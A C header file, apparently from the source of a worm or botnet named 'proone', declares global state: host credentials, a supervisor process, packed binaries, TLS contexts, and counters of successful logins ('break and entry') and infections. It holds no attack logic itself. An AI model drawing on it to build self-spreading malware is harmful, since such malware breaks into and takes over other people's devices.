#include "pack.h"
#include "resolv_worker.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>


struct prne_global {
	uint8_t *host_cred_data;
	size_t host_cred_size;
	struct timespec god_start;
	uint_fast64_t run_cnt;
	prne_resolv_wkr_ctx_t resolv;
	int god_exit_evt;
	int caught_signal;
	pid_t god_pid;
	pid_t proone_pid;
	int lock_shm_fd;
	bool bin_ready;
	bool is_child;
	
	prne_unpack_bin_archive_result_t bin_pack;
	prne_bin_archive_t bin_archive;

	struct {
		mbedtls_x509_crt ca;
		mbedtls_entropy_context entpy;
		mbedtls_ctr_drbg_context rnd;
	} ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_dhm_context dhm;
	} s_ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
	} c_ssl;
};

struct prne_shared_global {
	// "break and entry" count. Number of successful logins.
	uint_fast64_t bne_cnt;
	// Number of successful infections.
	uint_fast64_t infect_cnt;
};

static const intptr_t PRNE_RESOLV_WKR_ID = 0;
static const intptr_t PRNE_HTBT_WKR_ID = 1;


extern struct prne_global prne_g;
extern struct prne_shared_global *prne_s_g;
